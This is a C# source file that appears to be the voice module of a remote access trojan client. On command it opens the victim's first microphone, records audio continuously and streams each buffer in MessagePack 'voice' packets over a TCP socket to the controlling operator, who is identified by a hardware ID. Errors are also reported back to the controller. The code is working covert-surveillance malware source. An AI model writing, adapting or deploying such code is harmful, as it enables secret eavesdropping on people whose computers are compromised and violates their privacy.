using System;
using MessagePack;
using WaveLib;

namespace Client.HandlePacket
{
    internal class HandleVoice
    {
        public string Controler_HWID { get; set; }

        private bool _isRun = true;
        private WinSoundRecord _Recorder;

        public void Stop()
        {
            _isRun = false;
            Dispose();
        }

        public void OpenAudio(int samplesPerSecond, int bitsPerSample, int channels)
        {
            var inDeviceOpen = 0;
            try
            {
                var waveInDeviceName = WinSound.GetWaveInDeviceNames().Count > 0
                    ? WinSound.GetWaveInDeviceNames()[0]
                    : null;
                if (waveInDeviceName != null)
                {
                    _Recorder = new WinSoundRecord();
                    _Recorder.DataRecorded += Recorder_DataRecorded;
                    _Recorder.Open(waveInDeviceName, samplesPerSecond, bitsPerSample, channels, 1280, 8);
                }
                else
                {
                    inDeviceOpen = 1;
                }
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(Controler_HWID, ex.Message);
            }
        }

        private void Recorder_DataRecorded(byte[] bytes)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "voice";
            msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
            msgpack.ForcePathObject("Stream").SetAsBytes(bytes);
            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
        }

        private void Dispose()
        {
            _isRun = false;
            try
            {
                if (_Recorder != null)
                    _Recorder.Stop();
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(Controler_HWID, ex.Message);
            }
        }
    }
}